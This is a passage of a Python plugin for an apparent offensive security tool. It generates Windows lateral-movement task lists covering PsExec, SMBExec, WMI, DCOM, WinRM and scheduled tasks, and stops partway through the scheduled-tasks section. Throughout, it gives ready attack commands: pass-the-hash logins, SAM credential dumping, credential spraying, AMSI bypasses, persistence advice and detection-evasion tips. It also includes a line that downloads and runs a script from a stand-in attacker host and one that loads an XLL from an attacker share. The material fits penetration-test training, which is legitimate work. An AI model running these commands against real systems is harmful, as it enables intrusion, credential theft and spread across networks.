"""
Lateral Movement plugin for Windows environments

Generates tasks for Windows lateral movement techniques including:
- PsExec/WinExec/SMBExec (Service-based execution)
- WMI-based execution (WmiExec)
- DCOM-based execution (MMC20, ShellWindows, Excel)
- RDP-based execution
- WinRM remote execution
- Scheduled Tasks (AtExec/SchtasksExec)
- Service Control Manager (SCMExec)

Extracted from HackTricks Windows Lateral Movement guides
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LateralMovementPlugin(ServicePlugin):
    """Windows Lateral Movement enumeration and execution plugin"""

    @property
    def name(self) -> str:
        return "lateral-movement"

    @property
    def default_ports(self) -> List[int]:
        # Lateral movement uses standard Windows ports
        return [445, 135, 3389, 5985, 5986]

    @property
    def service_names(self) -> List[str]:
        return ['lateral-movement', 'windows-lateral', 'lateral-exec']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Lateral movement is manually triggered, not auto-detected.
        Returns False to prevent automatic detection.
        User must explicitly request lateral movement tasks.
        """
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Windows lateral movement task tree"""

        tasks = {
            'id': f'lateral-movement-{target}',
            'name': f'Windows Lateral Movement: {target}',
            'type': 'parent',
            'children': []
        }

        # ========================================
        # 1. PSExec/WinExec/SMBExec (Service-Based)
        # ========================================
        psexec_tasks = {
            'id': f'psexec-techniques-{target}',
            'name': 'PsExec/SMBExec (Service-Based Execution)',
            'type': 'parent',
            'children': []
        }

        # 1.1 Manual Service Creation with sc.exe
        psexec_tasks['children'].append({
            'id': f'manual-sc-exec-{target}',
            'name': 'Manual Service Execution (sc.exe)',
            'type': 'command',
            'metadata': {
                'command': f'sc.exe \\\\{target} create HTSvc binPath= "cmd.exe /c whoami > C:\\\\Windows\\\\Temp\\\\o.txt" start= demand && sc.exe \\\\{target} start HTSvc && sc.exe \\\\{target} delete HTSvc',
                'description': 'Execute command via temporary service creation (no binary drop)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'WINDOWS'],
                'flag_explanations': {
                    '\\\\TARGET': 'Remote target hostname or IP',
                    'create HTSvc': 'Create service named HTSvc',
                    'binPath=': 'Service executable path (note: space after =)',
                    'start= demand': 'Service start type (manual start)',
                    '/c': 'Execute command and terminate',
                    'start HTSvc': 'Start the service (executes command)',
                    'delete HTSvc': 'Remove service for cleanup'
                },
                'success_indicators': [
                    'CreateService SUCCESS',
                    'StartService SUCCESS (may timeout but still executes)',
                    'Output file created in C:\\Windows\\Temp\\'
                ],
                'failure_indicators': [
                    'Access is denied (5): Not local admin or UAC restriction',
                    'Network path not found (53): Firewall blocking SMB',
                    'RPC server unavailable: Service unreachable'
                ],
                'next_steps': [
                    'Retrieve output: type \\\\{target}\\C$\\Windows\\Temp\\o.txt',
                    'For interactive shell: Use PsExec.exe or Impacket psexec.py',
                    'Check event logs for detection: Security 7045 (Service Install)'
                ],
                'alternatives': [
                    f'Copy payload: copy payload.exe \\\\{target}\\ADMIN$\\Temp\\payload.exe',
                    f'Execute payload: sc.exe \\\\{target} create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe"',
                    'Impacket: psexec.py DOMAIN/user:Password@{target} cmd.exe'
                ],
                'notes': 'Requires: Local Admin, SMB (445) open, ADMIN$ share accessible. Service start timeout is expected for non-service binaries but execution still occurs. UAC Remote Restrictions apply for local accounts (need built-in Administrator or LocalAccountTokenFilterPolicy=1).'
            }
        })

        # 1.2 Sysinternals PsExec.exe
        psexec_tasks['children'].append({
            'id': f'sysinternals-psexec-{target}',
            'name': 'Sysinternals PsExec.exe',
            'type': 'command',
            'metadata': {
                'command': f'PsExec64.exe -accepteula \\\\{target} -s -i cmd.exe',
                'description': 'Interactive SYSTEM shell via Sysinternals PsExec',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'WINDOWS'],
                'flag_explanations': {
                    '-accepteula': 'Auto-accept EULA (avoid registry prompt)',
                    '-s': 'Run as SYSTEM account',
                    '-i': 'Interactive session (required for GUI)',
                    '-u DOMAIN\\user': 'Specify credentials (if not current user)',
                    '-p Password': 'Password for specified user',
                    '-r ServiceName': 'Custom service name (OPSEC - default is PSEXESVC)'
                },
                'success_indicators': [
                    'cmd.exe prompt appears',
                    'whoami returns: nt authority\\system',
                    'PSEXESVC.exe created in C:\\Windows\\'
                ],
                'failure_indicators': [
                    'Access is denied: Need local admin rights',
                    'Network path not found: SMB blocked or offline',
                    'Could not start PSEXESVC: AV/EDR blocking'
                ],
                'next_steps': [
                    'Enumerate system: whoami /all, systeminfo, net user',
                    'Dump credentials: reg save HKLM\\SAM sam.save',
                    'Establish persistence before exiting'
                ],
                'alternatives': [
                    f'Impacket psexec.py: psexec.py DOMAIN/user:Password@{target} cmd.exe',
                    f'CrackMapExec: cme smb {target} -u USER -p PASS -x whoami --exec-method psexec',
                    f'Manual sc.exe: See "Manual Service Execution" task'
                ],
                'notes': 'OPSEC: Leaves PSEXESVC.exe in C:\\Windows\\, Service Install events (7045), ADMIN$ file access (5140/5145). Use -r flag to customize service name. Available directly from WebDAV: \\\\live.sysinternals.com\\tools\\PsExec64.exe'
            }
        })

        # 1.3 Impacket psexec.py
        psexec_tasks['children'].append({
            'id': f'impacket-psexec-{target}',
            'name': 'Impacket psexec.py (RemCom)',
            'type': 'command',
            'metadata': {
                'command': f'psexec.py DOMAIN/user:Password@{target} cmd.exe',
                'description': 'PsExec-like execution using RemCom service',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'LINUX'],
                'flag_explanations': {
                    'DOMAIN/user:Password@target': 'Credentials and target (password auth)',
                    '-hashes LMHASH:NTHASH': 'Pass-the-Hash instead of password',
                    '-k': 'Use Kerberos authentication',
                    '-no-pass': 'Use cached Kerberos ticket (KRB5CCNAME)',
                    '-dc-ip': 'Domain Controller IP (for Kerberos)',
                    '-service-name HTSvc': 'Custom service name (default: RemComSvc)',
                    '-codec utf-8': 'Output encoding'
                },
                'success_indicators': [
                    'Shell prompt appears: C:\\Windows\\system32>',
                    'Random 8-char .exe in C:\\Windows\\',
                    'Service created: RemComSvc (or custom name)'
                ],
                'failure_indicators': [
                    'STATUS_ACCESS_DENIED: Invalid credentials or not admin',
                    'Connection timeout: Firewall blocking SMB/RPC',
                    'Kerberos error: Use hostname/FQDN, not IP'
                ],
                'next_steps': [
                    'Execute enumeration: whoami, ipconfig, net user',
                    'Upload tools: Use SMB or certutil download',
                    'Pivot to other systems: net view, nltest'
                ],
                'alternatives': [
                    f'Pass-the-Hash: psexec.py -hashes :NTHASH DOMAIN/user@{target} cmd.exe',
                    f'Kerberos: psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe',
                    f'Custom service: psexec.py -service-name HTSvc DOMAIN/user:Password@{target} powershell',
                    f'SMBExec (fileless): smbexec.py DOMAIN/user:Password@{target}'
                ],
                'notes': 'Artifacts: Random 8-char .exe in C:\\Windows\\, Service name "RemComSvc" (unless -service-name used), named pipe \\\\pipe\\remcom_*. Supports Pass-the-Hash and Kerberos. For semi-interactive without binary drop, use smbexec.py instead.'
            }
        })

        # 1.4 Impacket smbexec.py (fileless)
        psexec_tasks['children'].append({
            'id': f'impacket-smbexec-{target}',
            'name': 'Impacket smbexec.py (Fileless)',
            'type': 'command',
            'metadata': {
                'command': f'smbexec.py DOMAIN/user:Password@{target}',
                'description': 'Semi-interactive shell via service (no EXE drop)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'LINUX'],
                'flag_explanations': {
                    'DOMAIN/user:Password@target': 'Credentials and target',
                    '-hashes LMHASH:NTHASH': 'Pass-the-Hash authentication'
                },
                'success_indicators': [
                    'C:\\Windows\\system32> prompt',
                    'No dropped executable (more stealthy)',
                    'Service creates cmd.exe process with named pipe I/O'
                ],
                'failure_indicators': [
                    'Access denied: Not local admin',
                    'Connection failed: SMB/RPC blocked'
                ],
                'next_steps': [
                    'Execute commands normally (semi-interactive)',
                    'Upload files via certutil or PowerShell',
                    'Establish reverse shell for full interaction'
                ],
                'alternatives': [
                    f'psexec.py (drops binary): psexec.py DOMAIN/user:Password@{target}',
                    f'wmiexec.py (WMI-based): wmiexec.py DOMAIN/user:Password@{target}',
                    f'CrackMapExec: cme smb {target} -u USER -H NTHASH -x whoami --exec-method smbexec'
                ],
                'notes': 'More OPSEC-friendly than psexec.py - no binary dropped. Uses temporary service with cmd.exe and named pipes for I/O. Still generates Service Install events (7045).'
            }
        })

        # 1.5 CrackMapExec (multi-method)
        psexec_tasks['children'].append({
            'id': f'crackmapexec-exec-{target}',
            'name': 'CrackMapExec (Multiple Methods)',
            'type': 'command',
            'metadata': {
                'command': f'crackmapexec smb {target} -u USER -p PASS -x "whoami" --exec-method psexec',
                'description': 'Multi-protocol lateral movement tool',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'LINUX'],
                'flag_explanations': {
                    'smb': 'Protocol (smb, winrm, ssh, etc.)',
                    '-u USER': 'Username',
                    '-p PASS': 'Password',
                    '-H NTHASH': 'NTLM hash (Pass-the-Hash)',
                    '-x "command"': 'Execute command',
                    '--exec-method': 'Execution method (psexec, smbexec, wmiexec, atexec)',
                    '--shares': 'Enumerate SMB shares',
                    '--sam': 'Dump SAM hashes'
                },
                'success_indicators': [
                    '[+] Domain\\User:Password (Pwn3d!)',
                    'Command output displayed',
                    'SMB connection successful'
                ],
                'failure_indicators': [
                    '[-] Connection error',
                    '[-] STATUS_LOGON_FAILURE: Invalid credentials',
                    '[-] STATUS_ACCESS_DENIED: Valid creds but not admin'
                ],
                'next_steps': [
                    'Dump credentials: cme smb {target} -u USER -p PASS --sam',
                    'Enumerate shares: cme smb {target} -u USER -p PASS --shares',
                    'Spray credentials across subnet: cme smb 10.0.0.0/24 -u USER -p PASS'
                ],
                'alternatives': [
                    f'Try different methods: --exec-method smbexec (fileless)',
                    f'Try different methods: --exec-method wmiexec (WMI-based)',
                    f'Try different methods: --exec-method atexec (scheduled task)',
                    f'Direct Impacket tools: psexec.py, smbexec.py, wmiexec.py'
                ],
                'notes': 'Versatile tool supporting multiple execution methods and protocols. Great for credential validation and lateral movement automation. Can be noisy in large-scale operations.'
            }
        })

        tasks['children'].append(psexec_tasks)

        # ========================================
        # 2. WMI-Based Execution (WmiExec)
        # ========================================
        wmi_tasks = {
            'id': f'wmi-techniques-{target}',
            'name': 'WMI-Based Execution (WmiExec)',
            'type': 'parent',
            'children': []
        }

        # 2.1 Manual WMI Execution via wmic
        wmi_tasks['children'].append({
            'id': f'manual-wmic-{target}',
            'name': 'Manual WMI Execution (wmic)',
            'type': 'command',
            'metadata': {
                'command': f'wmic /node:{target} /user:DOMAIN\\user /password:password process call create "cmd.exe /c whoami > C:\\\\temp\\\\out.txt"',
                'description': 'Execute process remotely via WMI',
                'tags': ['OSCP:HIGH', 'MANUAL', 'WINDOWS'],
                'flag_explanations': {
                    '/node:target': 'Remote target hostname or IP',
                    '/user:DOMAIN\\user': 'Domain and username',
                    '/password:password': 'User password',
                    'process call create': 'Create new process (win32_process.Create)',
                    'ReturnValue = 0': 'Success indicator for process creation'
                },
                'success_indicators': [
                    'Executing (Win32_Process)->Create()',
                    'Method execution successful',
                    'ReturnValue = 0',
                    'Output file created'
                ],
                'failure_indicators': [
                    'Access denied: Not local admin or WMI disabled',
                    'RPC server unavailable: WMI service stopped or firewalled',
                    'Invalid credentials'
                ],
                'next_steps': [
                    'Retrieve output: type \\\\{target}\\C$\\temp\\out.txt',
                    'Deploy Empire/Metasploit agent: wmic process call create "empire launcher"',
                    'For interactive shell: Use Impacket wmiexec.py'
                ],
                'alternatives': [
                    'PowerShell: Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList "cmd.exe"',
                    f'Impacket: wmiexec.py DOMAIN/user:Password@{target}',
                    f'From file: wmic /node:@targets.txt process call create "command"'
                ],
                'notes': 'WMI is more stealthy than PsExec - no binary dropped, no service created. Requires: Local Admin, DCOM/WMI enabled (135, 445). OPSEC: Generates WMI event logs, process creation events (Sysmon 1).'
            }
        })

        # 2.2 PowerShell WMI Enumeration
        wmi_tasks['children'].append({
            'id': f'powershell-wmi-enum-{target}',
            'name': 'PowerShell WMI Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'Get-WmiObject -Class win32_operatingsystem -ComputerName {target} | select *',
                'description': 'Remote WMI enumeration via PowerShell',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'WINDOWS'],
                'flag_explanations': {
                    '-Class win32_operatingsystem': 'WMI class to query',
                    '-ComputerName': 'Remote target',
                    '-Credential': 'Specify alternate credentials',
                    'Get-WmiObject': 'Legacy cmdlet (works on all PS versions)',
                    'Get-CimInstance': 'Modern replacement (PS 3.0+)'
                },
                'success_indicators': [
                    'System information returned (Caption, Version, BuildNumber)',
                    'No access denied errors'
                ],
                'failure_indicators': [
                    'Access denied: Invalid credentials or not admin',
                    'RPC server unavailable: WMI blocked'
                ],
                'next_steps': [
                    'Enumerate processes: Get-WmiObject win32_process -ComputerName {target}',
                    'Enumerate users: Get-WmiObject win32_useraccount -ComputerName {target}',
                    'Check local admins: Use WMI to query administrators group'
                ],
                'alternatives': [
                    'Modern syntax: Get-CimInstance -ClassName win32_operatingsystem -ComputerName {target}',
                    'Invoke methods: Invoke-WmiMethod -Class win32_share -Name Create',
                    'List WMI classes: Get-WmiObject -List -Recurse'
                ],
                'notes': 'WMI classes: win32_process, win32_service, win32_share, win32_useraccount, win32_group, win32_operatingsystem. Namespace defaults to root\\cimv2.'
            }
        })

        # 2.3 Impacket wmiexec.py
        wmi_tasks['children'].append({
            'id': f'impacket-wmiexec-{target}',
            'name': 'Impacket wmiexec.py',
            'type': 'command',
            'metadata': {
                'command': f'wmiexec.py DOMAIN/user:Password@{target}',
                'description': 'Semi-interactive shell via WMI',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'LINUX'],
                'flag_explanations': {
                    'DOMAIN/user:Password@target': 'Credentials and target',
                    '-hashes LMHASH:NTHASH': 'Pass-the-Hash authentication',
                    '-k': 'Kerberos authentication',
                    '-no-pass': 'Use cached Kerberos ticket',
                    '-dc-ip': 'Domain Controller IP',
                    '-shell-type': 'Shell type (cmd, powershell)'
                },
                'success_indicators': [
                    'C:\\> prompt appears',
                    'Command execution successful',
                    'No binary dropped on target'
                ],
                'failure_indicators': [
                    'Access denied: Not local admin',
                    'DCOM/WMI unavailable: Service disabled or firewalled'
                ],
                'next_steps': [
                    'Execute enumeration commands',
                    'Upload tools via certutil or PowerShell',
                    'Pivot to other systems'
                ],
                'alternatives': [
                    f'Pass-the-Hash: wmiexec.py -hashes :NTHASH DOMAIN/user@{target}',
                    f'PowerShell shell: wmiexec.py -shell-type powershell DOMAIN/user:Password@{target}',
                    'Manual wmic: See "Manual WMI Execution" task',
                    f'SharpWMI: SharpWMI.exe action=exec computername={target} command="cmd.exe"'
                ],
                'notes': 'More stealthy than PsExec - no service or binary dropped. Uses WMI win32_process.Create method. Generates WMI event logs and process creation events. Supports Pass-the-Hash and Kerberos.'
            }
        })

        # 2.4 SharpWMI (C# tool)
        wmi_tasks['children'].append({
            'id': f'sharpwmi-{target}',
            'name': 'SharpWMI (C# WMI Execution)',
            'type': 'command',
            'metadata': {
                'command': f'SharpWMI.exe action=exec computername={target} command="C:\\\\temp\\\\process.exe" amsi=disable',
                'description': 'C# WMI execution tool with AMSI bypass',
                'tags': ['OSCP:MEDIUM', 'WINDOWS', 'AUTOMATED'],
                'flag_explanations': {
                    'action=exec': 'Execute command action',
                    'action=executevbs': 'Execute VBScript (stealthier)',
                    'computername=HOST': 'Target computer (comma-separated for multiple)',
                    'command=': 'Command or executable path',
                    'amsi=disable': 'Disable AMSI for PowerShell execution',
                    'result=true': 'Return command output',
                    'eventname=': 'Event name for VBS execution'
                },
                'success_indicators': [
                    'Command executed successfully',
                    'Process created on target',
                    'AMSI bypass successful (if PowerShell)'
                ],
                'failure_indicators': [
                    'Access denied: Not admin',
                    'WMI unavailable',
                    'AMSI bypass failed (AV detection)'
                ],
                'next_steps': [
                    'Use VBS for stealth: action=executevbs',
                    'Execute across multiple hosts',
                    'Chain with other lateral movement'
                ],
                'alternatives': [
                    f'VBScript exec: SharpWMI.exe action=executevbs computername={target} eventname=blah',
                    f'Impacket: wmiexec.py DOMAIN/user:Password@{target}',
                    f'SharpMove: SharpMove.exe action=create computername={target} command="payload.exe"'
                ],
                'notes': 'SharpWMI GitHub: https://github.com/GhostPack/SharpWMI. VBScript execution is stealthier than direct command execution. AMSI bypass may trigger AV.'
            }
        })

        tasks['children'].append(wmi_tasks)

        # ========================================
        # 3. DCOM-Based Execution
        # ========================================
        dcom_tasks = {
            'id': f'dcom-techniques-{target}',
            'name': 'DCOM-Based Execution',
            'type': 'parent',
            'children': []
        }

        # 3.1 MMC20.Application DCOM
        dcom_tasks['children'].append({
            'id': f'dcom-mmc20-{target}',
            'name': 'MMC20.Application DCOM Execution',
            'type': 'command',
            'metadata': {
                'command': f'$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "{target}")); $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")',
                'description': 'Execute commands via MMC20.Application COM object',
                'tags': ['OSCP:HIGH', 'MANUAL', 'WINDOWS'],
                'flag_explanations': {
                    'GetTypeFromProgID': 'Get COM type from ProgID',
                    'CreateInstance': 'Instantiate remote COM object',
                    'MMC20.Application': 'MMC Application Class ProgID',
                    'ExecuteShellCommand': 'Method to execute commands',
                    'arg1': 'Command (cmd.exe, powershell.exe, etc.)',
                    'arg2': 'Directory (null for default)',
                    'arg3': 'Parameters (/c command)',
                    'arg4': 'WindowState (7 = minimized)'
                },
                'success_indicators': [
                    'COM object created successfully',
                    'No access denied error',
                    'Process executes on target',
                    'Check task manager on target for process'
                ],
                'failure_indicators': [
                    'Access denied: Not local admin or DCOM disabled',
                    'RPC server unavailable: DCOM blocked (135, 445)',
                    'Class not registered: ProgID incorrect or OS version mismatch'
                ],
                'next_steps': [
                    'Execute reverse shell: cmd.exe /c powershell -enc <base64>',
                    'Upload file first: copy payload.exe \\\\{target}\\C$\\temp\\',
                    'Verify execution: Check process list remotely'
                ],
                'alternatives': [
                    'ShellWindows: See "ShellWindows DCOM" task',
                    'Excel DCOM: See "Excel DCOM" task',
                    f'Impacket: dcomexec.py DOMAIN/user:Password@{target} "cmd.exe /c whoami"',
                    f'SharpLateral: SharpLateral.exe reddcom {target} C:\\payload.exe'
                ],
                'notes': 'MMC20.Application lacks explicit LaunchPermissions (defaults to Administrators). Original research: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/. Requires DCOM enabled (port 135).'
            }
        })

        # 3.2 ShellWindows DCOM
        dcom_tasks['children'].append({
            'id': f'dcom-shellwindows-{target}',
            'name': 'ShellWindows DCOM Execution',
            'type': 'command',
            'metadata': {
                'command': f'$com = [Type]::GetTypeFromCLSID("<CLSID>", "{target}"); $obj = [System.Activator]::CreateInstance($com); $item = $obj.Item(); $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\\windows\\system32", $null, 0)',
                'description': 'Execute commands via ShellWindows DCOM object',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'WINDOWS'],
                'flag_explanations': {
                    'GetTypeFromCLSID': 'Get COM type from CLSID (no ProgID)',
                    '<CLSID>': 'CLSID for ShellWindows (use OleView .NET)',
                    'Item()': 'Get item from ShellWindows collection',
                    'ShellExecute': 'Execute command method',
                    'arg1': 'File to execute (cmd.exe, powershell.exe)',
                    'arg2': 'Parameters',
                    'arg3': 'Working directory',
                    'arg4': 'Verb (null for default)',
                    'arg5': 'Show command (0 = hidden)'
                },
                'success_indicators': [
                    'COM object created',
                    'Item() returns object',
                    'ShellExecute runs without error',
                    'Process visible on target'
                ],
                'failure_indicators': [
                    'Access denied: Not admin',
                    'Item() returns null: No explorer.exe running',
                    'DCOM disabled or firewalled'
                ],
                'next_steps': [
                    'Execute payload: Upload first, then ShellExecute',
                    'Use ShellBrowserWindow: Similar technique, different CLSID',
                    'Chain with credential theft'
                ],
                'alternatives': [
                    'MMC20.Application: See "MMC20.Application DCOM" task',
                    'ShellBrowserWindow: Similar to ShellWindows',
                    f'Invoke-DCOM.ps1: https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1',
                    f'SharpMove: SharpMove.exe action=dcom computername={target} method=ShellBrowserWindow'
                ],
                'notes': 'ShellWindows lacks explicit LaunchPermissions. CLSID must be retrieved via OleView .NET. Requires explorer.exe running on target. Original research: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/'
            }
        })

        # 3.3 Excel DCOM (DDE)
        dcom_tasks['children'].append({
            'id': f'dcom-excel-{target}',
            'name': 'Excel DCOM Execution (DDE)',
            'type': 'command',
            'metadata': {
                'command': f'$Com = [Type]::GetTypeFromProgID("Excel.Application","{target}"); $Obj = [System.Activator]::CreateInstance($Com); $Obj.DisplayAlerts = $false; $Obj.DDEInitiate("cmd", "/c calc.exe")',
                'description': 'Execute commands via Excel DDE DCOM object',
                'tags': ['OSCP:MEDIUM', 'WINDOWS', 'MANUAL'],
                'flag_explanations': {
                    'Excel.Application': 'Excel COM ProgID',
                    'DisplayAlerts = $false': 'Suppress Excel dialogs',
                    'DDEInitiate': 'Dynamic Data Exchange command execution',
                    'RegisterXLL': 'Alternative method - load malicious XLL',
                    'arg1': 'Application (cmd, powershell)',
                    'arg2': 'Command to execute'
                },
                'success_indicators': [
                    'Excel.Application object created',
                    'DDEInitiate executes without error',
                    'Process created on target (check task manager)',
                    'Excel process may remain running'
                ],
                'failure_indicators': [
                    'Excel not installed on target',
                    'DDE disabled (security policy)',
                    'Access denied: Not admin or DCOM blocked'
                ],
                'next_steps': [
                    'Kill Excel process: taskkill /F /IM excel.exe /S {target}',
                    'Try RegisterXLL: $Obj.RegisterXLL("\\\\attacker\\share\\evil.xll")',
                    'Detect Office version: Check ProductCode'
                ],
                'alternatives': [
                    'RegisterXLL method: $obj.Application.RegisterXLL("C:\\path\\evil.xll")',
                    'Detect Office version: $isx64 = [boolean]$obj.Application.ProductCode[21]',
                    f'Invoke-DCOM.ps1: Invoke-DCOM -ComputerName {target} -Method ExcelDDE -Command "cmd /c whoami"',
                    'Other Office apps: Word, Outlook (similar methods)'
                ],
                'notes': 'Requires Microsoft Office installed on target. DDE may be disabled in modern Excel versions (security update). Excel process remains running (cleanup required). Reference: https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom'
            }
        })

        # 3.4 Impacket dcomexec.py
        dcom_tasks['children'].append({
            'id': f'impacket-dcomexec-{target}',
            'name': 'Impacket dcomexec.py',
            'type': 'command',
            'metadata': {
                'command': f'dcomexec.py DOMAIN/user:Password@{target} "cmd.exe /c whoami"',
                'description': 'Execute commands via DCOM using Impacket',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'LINUX'],
                'flag_explanations': {
                    'DOMAIN/user:Password@target': 'Credentials and target',
                    '-hashes LMHASH:NTHASH': 'Pass-the-Hash authentication',
                    '-object': 'DCOM object to use (MMC20, ShellWindows, ShellBrowserWindow)',
                    '-silentcommand': 'Execute without output retrieval'
                },
                'success_indicators': [
                    'Command output returned',
                    'DCOM object executed successfully',
                    'No access denied errors'
                ],
                'failure_indicators': [
                    'Access denied: Not admin',
                    'DCOM unavailable: RPC server unavailable',
                    'Object not supported: Try different -object'
                ],
                'next_steps': [
                    'Try different DCOM objects if one fails',
                    'Execute reverse shell payload',
                    'Combine with credential dumping'
                ],
                'alternatives': [
                    'Different objects: -object MMC20, -object ShellWindows',
                    f'Manual PowerShell: See MMC20/ShellWindows tasks',
                    f'SharpLateral: SharpLateral.exe reddcom {target} C:\\payload.exe'
                ],
                'notes': 'Supports MMC20.Application, ShellBrowserWindow, ShellWindows DCOM objects. Currently supports MMC20. Pass-the-Hash and Kerberos supported.'
            }
        })

        tasks['children'].append(dcom_tasks)

        # ========================================
        # 4. WinRM (PowerShell Remoting)
        # ========================================
        winrm_tasks = {
            'id': f'winrm-techniques-{target}',
            'name': 'WinRM (PowerShell Remoting)',
            'type': 'parent',
            'children': []
        }

        # 4.1 PowerShell Enter-PSSession
        winrm_tasks['children'].append({
            'id': f'enter-pssession-{target}',
            'name': 'Interactive PowerShell Session (Enter-PSSession)',
            'type': 'command',
            'metadata': {
                'command': f'Enter-PSSession -ComputerName {target} -Credential (Get-Credential)',
                'description': 'Interactive PowerShell session via WinRM',
                'tags': ['OSCP:HIGH', 'MANUAL', 'WINDOWS'],
                'flag_explanations': {
                    '-ComputerName': 'Target computer hostname or IP',
                    '-Credential': 'Credentials (prompts if Get-Credential used)',
                    '-Authentication': 'Auth method (Default, Kerberos, Negotiate, etc.)',
                    '-Port': 'WinRM port (5985 HTTP, 5986 HTTPS)',
                    '-UseSSL': 'Use HTTPS (port 5986)',
                    '-SessionOption': 'Advanced session options'
                },
                'success_indicators': [
                    'Prompt changes to: [target]: PS C:\\>',
                    'Can execute commands remotely',
                    'No authentication errors'
                ],
                'failure_indicators': [
                    'WinRM cannot connect: Service not running or firewalled',
                    'Access denied: Not in Remote Management Users group',
                    'CredSSP error: Authentication method not supported'
                ],
                'next_steps': [
                    'Enumerate system: Get-ComputerInfo, Get-LocalUser',
                    'Execute scripts: Invoke-Expression (iex)',
                    'Exit session: Exit-PSSession'
                ],
                'alternatives': [
                    f'One-liner: Invoke-Command -ComputerName {target} -ScriptBlock {{whoami}} -Credential (Get-Credential)',
                    f'Evil-WinRM: evil-winrm -i {target} -u user -p password',
                    f'From Linux: See "Evil-WinRM" task'
                ],
                'notes': 'Requires WinRM enabled (default on Server 2012+), membership in Remote Management Users or Administrators. Uses Kerberos by default (NTLM if IP used). Ports: 5985 (HTTP), 5986 (HTTPS). Enable: Enable-PSRemoting -Force'
            }
        })

        # 4.2 Invoke-Command
        winrm_tasks['children'].append({
            'id': f'invoke-command-{target}',
            'name': 'Remote Command Execution (Invoke-Command)',
            'type': 'command',
            'metadata': {
                'command': f'Invoke-Command -ComputerName {target} -ScriptBlock {{Get-Process}} -Credential (Get-Credential)',
                'description': 'Execute script block on remote system via WinRM',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'WINDOWS'],
                'flag_explanations': {
                    '-ComputerName': 'Target(s) - single host or array',
                    '-ScriptBlock': 'PowerShell code to execute remotely',
                    '-FilePath': 'Local script file to execute remotely',
                    '-Credential': 'Credentials for authentication',
                    '-ArgumentList': 'Arguments to pass to ScriptBlock',
                    '-AsJob': 'Run as background job'
                },
                'success_indicators': [
                    'Script block executes successfully',
                    'Output returned from remote system',
                    'PSComputerName property in output'
                ],
                'failure_indicators': [
                    'WinRM unavailable',
                    'Access denied: Not authorized',
                    'Script errors: Check syntax'
                ],
                'next_steps': [
                    'Execute scripts: -FilePath .\\script.ps1',
                    'Download and execute: Invoke-Command -ScriptBlock {iex (iwr http://attacker/script.ps1)}',
                    'Multiple hosts: -ComputerName host1,host2,host3'
                ],
                'alternatives': [
                    'Interactive: Enter-PSSession -ComputerName {target}',
                    f'From file: Invoke-Command -FilePath script.ps1 -ComputerName {target}',
                    f'Evil-WinRM (Linux): evil-winrm -i {target} -u user -p pass',
                    f'Impacket: See pentesting-winrm.md for details'
                ],
                'notes': 'Can target multiple computers simultaneously. ScriptBlock executes in new PowerShell session on target. Results serialized and returned. Check: Test-WSMan {target} to verify WinRM availability.'
            }
        })

        # 4.3 Evil-WinRM (Linux)
        winrm_tasks['children'].append({
            'id': f'evil-winrm-{target}',
            'name': 'Evil-WinRM (Linux/Kali)',
            'type': 'command',
            'metadata': {
                'command': f'evil-winrm -i {target} -u username -p password',
                'description': 'WinRM shell from Linux with extra features',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'LINUX'],
                'flag_explanations': {
                    '-i': 'Target IP or hostname',
                    '-u': 'Username',
                    '-p': 'Password',
                    '-H': 'NTLM hash (Pass-the-Hash)',
                    '-s': 'Local path to share for upload (PowerShell scripts)',
                    '-e': 'Local path to share for upload (executables)',
                    '-P': 'Port (default 5985)',
                    '-S': 'Use SSL (HTTPS, port 5986)'
                },
                'success_indicators': [
                    '*Evil-WinRM* shell appears',
                    'Prompt: *Evil-WinRM* PS C:\\>',
                    'Can execute PowerShell commands'
                ],
                'failure_indicators': [
                    'Error: Connection refused (WinRM not enabled)',
                    'Error: Authentication failed (invalid credentials)',
                    'SSL error: Certificate validation failed (-S flag)'
                ],
                'next_steps': [
                    'Upload files: upload local.exe C:\\temp\\remote.exe',
                    'Download files: download C:\\file.txt local.txt',
                    'Load PowerShell scripts: menu â†’ load script.ps1',
                    'Bypass AMSI: Built-in bypass (automatic)'
                ],
                'alternatives': [
                    f'Pass-the-Hash: evil-winrm -i {target} -u user -H NTHASH',
                    f'With scripts: evil-winrm -i {target} -u user -p pass -s /opt/scripts/',
                    f'PowerShell: Enter-PSSession -ComputerName {target}',
                    'RubyWinRM: Original WinRM library for Ruby'
                ],
                'notes': 'Pre-installed on Kali Linux. Features: Upload/download, PowerShell script loading, AMSI bypass, menu system. GitHub: https://github.com/Hackplayers/evil-winrm. Check WinRM availability: nmap -p 5985,5986 {target}'
            }
        })

        tasks['children'].append(winrm_tasks)

        # ========================================
        # 5. Scheduled Tasks (AtExec/SchtasksExec)
        # ========================================
        schtasks_parent = {
            'id': f'schtasks-techniques-{target}',
            'name': 'Scheduled Tasks (AtExec/SchtasksExec)',
            'type': 'parent',
            'children': []
        }

        # 5.1 Legacy AT command
        schtasks_parent['children'].append({
            'id': f'at-command-{target}',
            'name': 'Legacy AT Command',
            'type': 'command',
            'metadata': {
